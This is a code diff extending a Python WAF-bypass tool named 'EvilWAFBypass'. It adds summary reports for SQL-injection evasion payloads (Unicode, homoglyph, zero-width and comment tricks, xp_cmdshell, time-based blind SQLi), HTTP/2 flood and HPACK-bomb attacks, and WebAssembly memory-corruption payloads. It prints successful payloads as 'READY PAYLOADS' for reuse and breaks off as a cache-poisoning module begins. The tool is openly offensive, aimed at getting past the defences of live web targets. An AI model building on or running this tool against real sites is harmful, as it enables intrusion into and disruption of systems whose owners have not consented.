+                payload_index = i - 1
+                if payload_index < len(ml_evasion_payloads):
+                    payload = ml_evasion_payloads[payload_index]
+                    
+                   
+                    if "/**/" in payload:
+                        payload_type = "SQL COMMENT INJECTION"
+                        description = "Uses comment blocks to split keywords"
+                    elif "ＳＥＬＥＣＴ" in payload:
+                        payload_type = "FULL-WIDTH UNICODE"
+                        description = "Uses full-width Unicode characters"
+                    elif "EXEC xp_cmdshell" in payload:
+                        payload_type = "COMMAND SPLITTING"
+                        description = "Splits SQL commands with comments"
+                    elif "\\u0065" in payload:
+                        payload_type = "UNICODE ESCAPE"
+                        description = "Uses Unicode escape sequences"
+                    elif "𝐹𝑅𝑂𝑀" in payload or "𝘶𝘴𝘦𝘳𝘴" in payload:
+                        payload_type = "HOMOGLYPH ATTACK"
+                        description = "Uses mathematical symbols as homoglyphs"
+                    elif "\u200b" in payload:
+                        payload_type = "ZERO-WIDTH SPACE"
+                        description = "Inserts zero-width spaces in payload"
+                    elif "SeLeCt" in payload and "FrOm" in payload:
+                        payload_type = "CASE ROTATION"
+                        description = "Alternates character case randomly"
+                    elif "&lt;" in payload and "&gt;" in payload:
+                        payload_type = "HTML ENTITY ENCODING"
+                        description = "Uses HTML entities for obfuscation"
+                    elif "/*!50000*/" in payload:
+                        payload_type = "MYSQL CONDITIONAL COMMENT"
+                        description = "Uses MySQL version-specific comments"
+                    elif "SLEEP(5)" in payload:
+                        payload_type = "TIME-BASED BLIND SQLi"
+                        description = "Uses time delays for blind injection"
+                    else:
+                        payload_type = "ADVANCED EVASION"
+                        description = "Custom ML evasion technique"
+                    
+                    # SHOW PAYLOAD PREVIEW
+                    payload_preview = payload[:55] + "..." if len(payload) > 55 else payload
+                    
+                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
+                    print(f"{Colors.CYAN}    Type: {payload_type:<30}{Colors.END}")
+                    print(f"{Colors.YELLOW}    Payload: {payload_preview:<52}{Colors.END}")
+                    print(f"{Colors.WHITE}    Description: {description:<63}{Colors.END}")
+                    print()
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.CYAN}{'EVASION TECHNIQUES EFFECTIVENESS':<35} {'SUCCESS':<8} {'DETECTION RATE':<15}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*35} {'─'*8} {'─'*15}{Colors.END}")
+            
+            technique_stats = {
+                'COMMENT OBFUSCATION': 0,
+                'UNICODE EVASION': 0,
+                'TOKEN SPLITTING': 0,
+                'HOMOGLYPH ATTACK': 0,
+                'INVISIBLE CHARS': 0,
+                'CASE MANIPULATION': 0,
+                'ENCODING EVASION': 0,
+                'TIME-BASED SQLi': 0
+            }
+            
+           
+            total_by_technique = {
+                'COMMENT OBFUSCATION': 2,  # 2 comment-based payloads
+                'UNICODE EVASION': 2,      # 2 unicode payloads
+                'TOKEN SPLITTING': 1,      # 1 token splitting
+                'HOMOGLYPH ATTACK': 1,     # 1 homoglyph
+                'INVISIBLE CHARS': 1,      # 1 zero-width
+                'CASE MANIPULATION': 1,    # 1 case rotation
+                'ENCODING EVASION': 1,     # 1 HTML entity
+                'TIME-BASED SQLi': 1       # 1 time-based
+            }
+            
+            for attack_name in results:
+                if "Comment" in attack_name:
+                    technique_stats['COMMENT OBFUSCATION'] += 1
+                elif "Full-Width" in attack_name or "Unicode Escape" in attack_name:
+                    technique_stats['UNICODE EVASION'] += 1
+                elif "Token" in attack_name:
+                    technique_stats['TOKEN SPLITTING'] += 1
+                elif "Homoglyph" in attack_name:
+                    technique_stats['HOMOGLYPH ATTACK'] += 1
+                elif "Zero-Width" in attack_name:
+                    technique_stats['INVISIBLE CHARS'] += 1
+                elif "Case Rotation" in attack_name:
+                    technique_stats['CASE MANIPULATION'] += 1
+                elif "HTML Entity" in attack_name:
+                    technique_stats['ENCODING EVASION'] += 1
+                elif "Time-Based" in attack_name:
+                    technique_stats['TIME-BASED SQLi'] += 1
+            
+            for technique, count in technique_stats.items():
+                if count > 0:
+                    total_attempts = total_by_technique.get(technique, 1)
+                    detection_rate = ((total_attempts - count) / total_attempts) * 100
+                    success_rate_tech = (count / total_attempts) * 100
+                    
+                    detection_color = Colors.GREEN if detection_rate < 30 else Colors.YELLOW if detection_rate < 60 else Colors.RED
+                    
+                    print(f"{Colors.WHITE}{technique:<35}{Colors.END} {Colors.GREEN}{count}/{total_attempts:<6}{Colors.END} {detection_color}{detection_rate:6.1f}%{'':<9}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.RED}{'WAF BYPASS CAPABILITIES':<35} {'LEVEL':<15} {'VULNERABILITY':<20}{Colors.END}")
+            print(f"{Colors.RED}{'─'*35} {'─'*15} {'─'*20}{Colors.END}")
+            
+            capabilities = []
+            
+            if any("Comment" in attack for attack in results):
+                capabilities.append(("COMMENT FILTER BYPASS", "MEDIUM", "Basic WAF evasion"))
+            
+            if any("Unicode" in attack for attack in results):
+                capabilities.append(("UNICODE NORMALIZATION BYPASS", "HIGH", "Advanced parsing bypass"))
+            
+            if any("Homoglyph" in attack for attack in results):
+                capabilities.append(("VISUAL SPOOFING BYPASS", "HIGH", "Character recognition"))
+            
+            if any("Zero-Width" in attack for attack in results):
+                capabilities.append(("INVISIBLE CHAR BYPASS", "CRITICAL", "Stealth injection"))
+            
+            if any("Case Rotation" in attack for attack in results):
+                capabilities.append(("CASE SENSITIVITY BYPASS", "MEDIUM", "Pattern matching"))
+            
+            if any("HTML Entity" in attack for attack in results):
+                capabilities.append(("ENCODING DETECTION BYPASS", "HIGH", "Decoding evasion"))
+            
+            if any("Time-Based" in attack for attack in results):
+                capabilities.append(("BEHAVIORAL ANALYSIS BYPASS", "CRITICAL", "ML model deception"))
+            
+            # Calculate overall WAF strength
+            bypass_capability = (success_payloads / total_payloads) * 100
+            waf_strength = 100 - bypass_capability
+            
+            for capability, level, vulnerability in capabilities:
+                level_color = Colors.RED if level == "CRITICAL" else Colors.YELLOW if level == "HIGH" else Colors.GREEN
+                print(f"{Colors.WHITE}{capability:<35}{Colors.END} {level_color}{level:<15}{Colors.END} {Colors.CYAN}{vulnerability:<20}{Colors.END}")
+            
+            print(f"\n{Colors.CYAN}{'OVERALL WAF ASSESSMENT':<25} {'STRENGTH':<10} {'BYPASS RATE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*10} {'─'*12}{Colors.END}")
+            
+            strength_color = Colors.RED if waf_strength < 40 else Colors.YELLOW if waf_strength < 70 else Colors.GREEN
+            bypass_color = Colors.GREEN if bypass_capability < 30 else Colors.YELLOW if bypass_capability < 60 else Colors.RED
+            
+            print(f"{Colors.WHITE}{'ML WAF Protection':<25}{Colors.END} {strength_color}{waf_strength:6.1f}[%]{'':<4}{Colors.END} {bypass_color}{bypass_capability:6.1f}[%]{'':<6}{Colors.END}")
+        
+        
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" ML EVASION COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} evasions successful ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+
+
+
+
     
     
     async def http2_stream_multiplexing(self, domain):
@@ -1964,20 +3411,22 @@ class EvilWAFBypass:
                 
                 attack_name = self.get_http2_attack_name(i)
                 if success:
-                    print(f"[-] {attack_name}: {status}")
+                    print(f"[-] {attack_name}:{Colors.YELLOW}{status}{Colors.END}")
                 else:
-                    print(f"[-] {attack_name}: Failed")
+                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                 
                 await asyncio.sleep(0.3)
                 
             except Exception as e:
                 attack_name = self.get_http2_attack_name(i)
-                print(f"[-] {attack_name}: Error - {e}")
+                print(f"[-] {attack_name}:{Colors.RED}ERROR - {e}{Colors.END}")
             finally:
                 if sock:
                     sock.close()
         
         print(f"[+] HTTP/2 Attacks: {successful_attacks}/{len(payloads)} Successful")
+        
+        await self.print_http2_summary_report(domain, results, payloads)
         return results    
 
     def get_http2_attack_name(self, index):
@@ -1989,6 +3438,310 @@ class EvilWAFBypass:
         }
         return attack_names.get(index, f"HTTP/2 Attack {index+1}")    
     
+
+
+
+
+
+
+    
+    async def print_http2_summary_report(self, domain, results, payloads):
+        """Print comprehensive HTTP/2 Stream Multiplexing summary"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+
+        print_bg_header("", '\033[44m')
+        print_bg_header(" HTTP/2 STREAM MULTIPLEXING BYPASS SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating HTTP/2 Stream Multiplexing summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+
+        total_payloads = len(payloads)
+        success_payloads = len(results)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+
+        print(f"\n{Colors.CYAN}{'HTTP/2 ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}[100.0%]{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Attacks':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Attacks':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL HTTP/2 ATTACKS':<30} {'TECHNIQUE':<25} {'PORT':<10}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*30} {'─'*25} {'─'*10}{Colors.END}")
+            
+            for i, attack_result in enumerate(results, 1):
+
+                if "Stream Dependency" in attack_result:
+                    technique = "STREAM PRIORITY HIJACK"
+                    attack_type = "PRIORITY EXPLOIT"
+                elif "HPACK Compression" in attack_result:
+                    technique = "HPACK COMPRESSION"
+                    attack_type = "HEADER COMPRESSION"
+                elif "RST Stream Flood" in attack_result:
+                    technique = "RST STREAM FLOOD"
+                    attack_type = "CONNECTION RESET"
+                else:
+                    technique = "STREAM MULTIPLEXING"
+                    attack_type = "GENERIC ATTACK"
+                
+                # EXTRACT PORT INFORMATION
+                port_match = re.search(r'Port\s+(\d+)', attack_result)
+                port = port_match.group(1) if port_match else "Unknown"
+                
+                # EXTRACT STATUS
+                status = "Success" if "Success" in attack_result else "Timeout" if "Timeout" in attack_result else "Unknown"
+                status_color = Colors.GREEN if status == "Success" else Colors.YELLOW
+                
+                attack_name = self.get_http2_attack_name(i-1)
+                
+                print(f"{Colors.WHITE}{i:>2}. {attack_name:<27}{Colors.END} {Colors.CYAN}{technique:<25}{Colors.END} {Colors.YELLOW}{port:<10}{Colors.END}")
+                print(f"{Colors.WHITE}    Status: {status_color}{status:<15}{Colors.END} {Colors.CYAN}Type: {attack_type:<20}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            category_counts = {
+                'STREAM PRIORITY': 0,
+                'HPACK COMPRESSION': 0,
+                'RST STREAM FLOOD': 0,
+                'CONNECTION ATTACKS': 0
+            }
+            
+            for attack_result in results:
+                if "Stream Dependency" in attack_result:
+                    category_counts['STREAM PRIORITY'] += 1
+                elif "HPACK Compression" in attack_result:
+                    category_counts['HPACK COMPRESSION'] += 1
+                elif "RST Stream Flood" in attack_result:
+                    category_counts['RST STREAM FLOOD'] += 1
+                else:
+                    category_counts['CONNECTION ATTACKS'] += 1
+            
+            for category, count in category_counts.items():
+                if count > 0:
+                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                    print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.GREEN}{'HTTP/2 ATTACK PAYLOADS TECHNICAL ANALYSIS':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            for i, attack_result in enumerate(results, 1):
+                payload_index = i - 1
+                if payload_index < len(payloads):
+                    payload = payloads[payload_index]
+                    
+                    
+                    if b'PRI * HTTP/2.0' in payload:
+                        payload_type = "HTTP/2 PREFACE + FRAMES"
+                        frame_types = []
+                        
+                        if b'\x04\x00' in payload:
+                            frame_types.append("SETTINGS")
+                        if b'\x01\x04' in payload:
+                            frame_types.append("HEADERS")
+                        if b'\x03\x00' in payload:
+                            frame_types.append("RST_STREAM")
+                        
+                        frame_info = " + ".join(frame_types) if frame_types else "UNKNOWN FRAMES"
+                        
+                    elif b'\x00\x00\x1e\x01\x04' in payload:
+                        payload_type = "HPACK HEADERS FRAME"
+                        frame_info = "HEADERS + HPACK COMPRESSION"
+                    
+                    else:
+                        payload_type = "BINARY FRAMES"
+                        frame_info = "RAW HTTP/2 FRAMES"
+                    
+                    # PAYLOAD SIZE ANALYSIS
+                    payload_size = len(payload)
+                    frame_count = payload.count(b'\x00\x00')  # Rough frame count
+                    
+                    attack_name = self.get_http2_attack_name(payload_index)
+                    
+                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
+                    print(f"{Colors.CYAN}    Type: {payload_type:<30} Size: {payload_size} bytes{Colors.END}")
+                    print(f"{Colors.YELLOW}    Frames: {frame_info:<40}{Colors.END}")
+                    print(f"{Colors.WHITE}    Estimated Frames: {frame_count:<8} Status: {attack_result.split(':')[-1] if ':' in attack_result else 'Unknown'}{Colors.END}")
+                    print()
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.CYAN}{'PORT VULNERABILITY ANALYSIS':<15} {'ATTACKS':<8} {'SERVICE':<20} {'RISK':<10}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*15} {'─'*8} {'─'*20} {'─'*10}{Colors.END}")
+            
+            port_stats = {}
+            
+            for attack_result in results:
+                port_match = re.search(r'Port\s+(\d+)', attack_result)
+                if port_match:
+                    port = port_match.group(1)
+                    port_stats[port] = port_stats.get(port, 0) + 1
+            
+            for port, count in port_stats.items():
+                if port == "443":
+                    service = "HTTPS (TLS)"
+                    risk = "HIGH"
+                    risk_color = Colors.RED
+                elif port == "80":
+                    service = "HTTP"
+                    risk = "MEDIUM"
+                    risk_color = Colors.YELLOW
+                elif port == "8443":
+                    service = "ALT HTTPS"
+                    risk = "HIGH"
+                    risk_color = Colors.RED
+                else:
+                    service = "UNKNOWN"
+                    risk = "LOW"
+                    risk_color = Colors.GREEN
+                
+                print(f"{Colors.WHITE}{port:<15}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{service:<20}{Colors.END} {risk_color}{risk:<10}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.RED}{'HTTP/2 IMPLEMENTATION VULNERABILITIES':<35} {'SEVERITY':<15} {'IMPACT':<25}{Colors.END}")
+            print(f"{Colors.RED}{'─'*35} {'─'*15} {'─'*25}{Colors.END}")
+            
+            vulnerabilities = []
+            
+            if any("Stream Dependency" in attack for attack in results):
+                vulnerabilities.append((
+                    "STREAM PRIORITY HIJACKING", 
+                    "HIGH", 
+                    "Traffic prioritization bypass"
+                ))
+            
+            if any("HPACK Compression" in attack for attack in results):
+                vulnerabilities.append((
+                    "HPACK COMPRESSION BOMB", 
+                    "CRITICAL", 
+                    "Memory exhaustion attack"
+                ))
+            
+            if any("RST Stream Flood" in attack for attack in results):
+                vulnerabilities.append((
+                    "RST STREAM FLOOD", 
+                    "MEDIUM", 
+                    "Connection instability"
+                ))
+            
+            if any("Timeout" in attack for attack in results):
+                vulnerabilities.append((
+                    "RESOURCE EXHAUSTION", 
+                    "HIGH", 
+                    "Server resource drain"
+                ))
+            
+            # Add general HTTP/2 vulnerabilities
+            if success_rate > 50:
+                vulnerabilities.append((
+                    "PROTOCOL IMPLEMENTATION", 
+                    "HIGH", 
+                    "Weak HTTP/2 parsing"
+                ))
+            
+            for vuln, severity, impact in vulnerabilities:
+                severity_color = Colors.RED if severity == "[CRITICAL]" else Colors.YELLOW if severity == "[HIGH]" else Colors.GREEN
+                print(f"{Colors.WHITE}{vuln:<35}{Colors.END} {severity_color}{severity:<15}{Colors.END} {Colors.CYAN}{impact:<25}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.GREEN}{'SECURITY RECOMMENDATIONS':<50} {'PRIORITY':<12}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*50} {'─'*12}{Colors.END}")
+            
+            recommendations = []
+            
+            if any("Stream Dependency" in attack for attack in results):
+                recommendations.append((
+                    "Implement stream priority validation",
+                    "HIGH"
+                ))
+            
+            if any("HPACK Compression" in attack for attack in results):
+                recommendations.append((
+                    "Add HPACK compression limits",
+                    "CRITICAL"
+                ))
+            
+            if any("RST Stream Flood" in attack for attack in results):
+                recommendations.append((
+                    "Rate limit RST_STREAM frames",
+                    "MEDIUM"
+                ))
+            
+            if success_rate > 0:
+                recommendations.append((
+                    "Update HTTP/2 implementation",
+                    "HIGH"
+                ))
+                recommendations.append((
+                    "Enable HTTP/2 security features",
+                    "MEDIUM"
+                ))
+            
+            for rec, priority in recommendations:
+                priority_color = Colors.RED if priority == "[CRITICAL]" else Colors.YELLOW if priority == "[HIGH]" else Colors.GREEN
+                print(f"{Colors.WHITE}{rec:<50}{Colors.END} {priority_color}{priority:<12}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.CYAN}{'HTTP/2 SECURITY ASSESSMENT':<30} {'SCORE':<10} {'STATUS':<15}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*30} {'─'*10} {'─'*15}{Colors.END}")
+            
+            # Calculate security score (0-100)
+            security_score = 100 - success_rate
+            security_status = "[SECURE]" if security_score >= 80 else "[VULNERABLE]" if security_score >= 50 else "[CRITICAL]"
+            status_color = Colors.GREEN if security_status == "[SECURE]" else Colors.YELLOW if security_status == "[VULNERABLE]" else Colors.RED
+            
+            print(f"{Colors.WHITE}{'Protocol Implementation':<30}{Colors.END} {Colors.YELLOW}{security_score:6.1f}/100{'':<4}{Colors.END} {status_color}{security_status:<15}{Colors.END}")
+            print(f"{Colors.WHITE}{'Attack Surface':<30}{Colors.END} {Colors.YELLOW}{success_rate:6.1f}[%]{'':<4}{Colors.END} {status_color}{'EXPOSED' if success_rate > 0 else 'PROTECTED':<15}{Colors.END}")
+        
+       
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" HTTP/2 SCAN COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} attacks successful ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+
+
+
+
+
+
     
 
     
@@ -2103,7 +3856,7 @@ class EvilWAFBypass:
                                 if any(success_indicators):
                                     results.append(f"WASM {attack_name}")
                                     successful_attacks += 1
-                                    print(f"[-] {attack_name} ({content_type}): Success")
+                                    print(f"[-] {attack_name} ({content_type}):{Colors.YELLOW}Success{Colors.END}")
                                     success = True
                                     break
                                     
@@ -2111,7 +3864,7 @@ class EvilWAFBypass:
                             # Timeout might indicate successful processing
                             results.append(f"WASM {attack_name} (Timeout)")
                             successful_attacks += 1
-                            print(f"[-] {attack_name}: Timeout")
+                            print(f"[-] {attack_name}:{Colors.RED}Timeout{Colors.END}")
                             success = True
                             break
                         except aiohttp.ClientError as e:
@@ -2124,15 +3877,17 @@ class EvilWAFBypass:
                         break
                         
             except Exception as e:
-                print(f"[-] {attack_name}: Error - {e}")
+                print(f"[-] {attack_name}:{Colors.RED}ERROR - {e}{Colors.END}")
             
             if not success:
-                print(f"[-] {attack_name}: Failed")
+                print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
             
             # Small delay between attempts
             await asyncio.sleep(0.3)
         
         print(f"[+] WASM Attacks: {successful_attacks}/{len(wasm_payloads)} Successful")
+        
+        await self.print_wasm_memory_corruption_summary(domain, results, wasm_payloads)
         return results
 
     def get_wasm_attack_name(self, index):
@@ -2158,7 +3913,935 @@ class EvilWAFBypass:
 
 
 
-    # ====
+
+    
+    async def print_wasm_memory_corruption_summary(self, domain, results, wasm_payloads):
+        """Print detailed summary for WASM memory corruption attacks"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+
+        print_bg_header("", '\033[44m')
+        print_bg_header(" WEBASSEMBLY MEMORY CORRUPTION ATTACK SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating WebAssembly Memory Corruption summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+
+        total_payloads = len(wasm_payloads)
+        success_payloads = len(results)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+
+        print(f"\n{Colors.CYAN}{'WASM ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Bypass':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Bypass':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL WASM BYPASS PAYLOADS':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            for i, attack_name in enumerate(results, 1):
+                payload_index = i - 1
+                if payload_index < len(wasm_payloads):
+                    payload = wasm_payloads[payload_index]
+                    payload_size = len(payload)
+                    
+                    # 
+                    attack_type = attack_name.replace("WASM ", "")
+                    
+                    print(f"\n{Colors.WHITE}{i:>2}. {attack_type:<20} {Colors.CYAN}({payload_size} bytes){Colors.END}")
+                    
+
+                    hex_payload = payload.hex()
+                    
+
+                    hex_chunks = [hex_payload[j:j+2] for j in range(0, len(hex_payload), 2)]
+                    hex_display = ' '.join(hex_chunks)
+                    
+                    print(f"{Colors.YELLOW}    HEX: {hex_display}{Colors.END}")
+                    
+
+                    print(f"{Colors.CYAN}    Bytes: {repr(payload)}{Colors.END}")
+                    
+                    
+                    print(f"{Colors.GREEN}    Python: b'{hex_payload}'{Colors.END}")
+        
+
+        print(f"\n{Colors.MAGENTA}{'DETAILED PAYLOAD ANALYSIS (ALL PAYLOADS)':<80}{Colors.END}")
+        print(f"{Colors.MAGENTA}{'─'*80}{Colors.END}")
+        
+        for i, payload in enumerate(wasm_payloads, 1):
+            attack_name = self.get_wasm_attack_name(i-1)
+            payload_size = len(payload)
+            status = "[*]YPASS" if i-1 < len(results) else "[*]FAILED"
+            status_color = Colors.GREEN if status == "[*]YPASS" else Colors.RED
+            
+
+            has_wasm_magic = payload.startswith(b'\x00asm')
+            magic_status = "VALID WASM" if has_wasm_magic else "MODIFIED"
+            
+
+            if b'\x05' in payload and b'\x00\x01' in payload:
+                payload_type = "MEMORY GROWTH"
+            elif b'\x0b' in payload:
+                payload_type = "DATA SEGMENT" 
+            elif b'\x41\x00' in payload and payload_size > 100:
+                payload_type = "BUFFER OVERFLOW"
+            elif b'\x60\x00\x01\x7f' in payload and b'\x60\x00\x01\x7e' in payload:
+                payload_type = "TYPE CONFUSION"
+            else:
+                payload_type = "GENERIC WASM"
+            
+            print(f"\n{Colors.WHITE}{i:>2}. {attack_name:<20} {Colors.CYAN}{payload_type:<15} {status_color}{status:<10}{Colors.END}")
+            print(f"{Colors.CYAN}    Size: {payload_size:3} bytes | Magic: {magic_status:<12} | Index: {i-1}{Colors.END}")
+            
+           
+            hex_preview = payload[:20].hex()
+            hex_display = ' '.join([hex_preview[j:j+2] for j in range(0, len(hex_preview), 2)])
+            print(f"{Colors.YELLOW}    Preview: {hex_display}{'...' if payload_size > 20 else ''}{Colors.END}")
+            
+
+            if i-1 < len(results):  # Only for successful payloads
+                print(f"{Colors.GREEN}    Copy: b'{payload.hex()}'{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.CYAN}{'BYPASS RATE BY PAYLOAD TYPE':<25} {'SUCCESS':<8} {'TOTAL':<8} {'RATE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*8} {'─'*12}{Colors.END}")
+            
+            type_stats = {}
+            
+            for i, attack_name in enumerate(results):
+                payload_type = self.get_wasm_attack_name(i)
+                if payload_type not in type_stats:
+                    type_stats[payload_type] = {'success': 0, 'total': 0}
+                type_stats[payload_type]['success'] += 1
+            
+            # COUNT TOTAL FOR EACH TYPE
+            for i in range(len(wasm_payloads)):
+                payload_type = self.get_wasm_attack_name(i)
+                if payload_type not in type_stats:
+                    type_stats[payload_type] = {'success': 0, 'total': 0}
+                type_stats[payload_type]['total'] += 1
+            
+            for payload_type, stats in type_stats.items():
+                success_count = stats['success']
+                total_count = stats['total']
+                bypass_rate = (success_count / total_count) * 100 if total_count > 0 else 0
+                
+                rate_color = Colors.GREEN if bypass_rate >= 50 else Colors.YELLOW if bypass_rate >= 25 else Colors.RED
+                
+                print(f"{Colors.WHITE}{payload_type:<25}{Colors.END} {Colors.GREEN}{success_count:<8}{Colors.END} {Colors.CYAN}{total_count:<8}{Colors.END} {rate_color}{bypass_rate:6.1f}%{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if wasm_payloads:
+            print(f"\n{Colors.BLUE}{'PAYLOAD SIZE ANALYSIS':<25} {'SIZE':<10} {'STATUS':<15}{Colors.END}")
+            print(f"{Colors.BLUE}{'─'*25} {'─'*10} {'─'*15}{Colors.END}")
+            
+            sizes = [len(p) for p in wasm_payloads]
+            avg_size = sum(sizes) / len(sizes)
+            min_size = min(sizes)
+            max_size = max(sizes)
+            
+            print(f"{Colors.WHITE}{'Average Size':<25}{Colors.END} {Colors.YELLOW}{avg_size:6.1f} bytes{'':<4}{Colors.END} {Colors.CYAN}{'ALL PAYLOADS':<15}{Colors.END}")
+            print(f"{Colors.WHITE}{'Smallest Payload':<25}{Colors.END} {Colors.GREEN}{min_size:6} bytes{'':<4}{Colors.END} {Colors.CYAN}{'MINIMUM':<15}{Colors.END}")
+            print(f"{Colors.WHITE}{'Largest Payload':<25}{Colors.END} {Colors.RED}{max_size:6} bytes{'':<4}{Colors.END} {Colors.CYAN}{'MAXIMUM':<15}{Colors.END}")
+            
+
+            successful_sizes = [len(wasm_payloads[i]) for i in range(len(results)) if i < len(wasm_payloads)]
+            if successful_sizes:
+                avg_success_size = sum(successful_sizes) / len(successful_sizes)
+                print(f"{Colors.WHITE}{'Avg Successful Size':<25}{Colors.END} {Colors.GREEN}{avg_success_size:6.1f} bytes{'':<4}{Colors.END} {Colors.GREEN}{'SUCCESSFUL':<15}{Colors.END}")
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{' READY PAYLOADS (SUCCESSFUL)':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            print(f"{Colors.CYAN}# Use these payloads in your code:{Colors.END}\n")
+            
+            for i, attack_name in enumerate(results, 1):
+                payload_index = i - 1
+                if payload_index < len(wasm_payloads):
+                    payload = wasm_payloads[payload_index]
+                    hex_payload = payload.hex()
+                    attack_type = attack_name.replace("WASM ", "")
+                    
+                    print(f"{Colors.YELLOW}# {attack_type} Payload ({len(payload)} bytes){Colors.END}")
+                    print(f"{Colors.WHITE}payload_{i} = b'{hex_payload}'{Colors.END}")
+                    print()
+        
+        
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" WASM MEMORY CORRUPTION  COMPLETED ", '\033[44m')
+        print_bg_header(f" {success_rate:.1f}% BYPASS RATE ({success_payloads}/{total_payloads}) ", '\033[44m')
+        print_bg_header(f" {len(wasm_payloads)} PAYLOADS ANALYZED ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+    
+
+
+
+
+
+
+
+
+
+    async def cache_poisoning_attack(self, domain):
+        """Cache Poisoning Attack Module"""
+        print(f"\033[45m PHASE 12: Cache Poisoning Attacks\033[0m")
+    
+        cache_poisoning_payloads = [
+            # Header Injection for Cache Poisoning
+            {
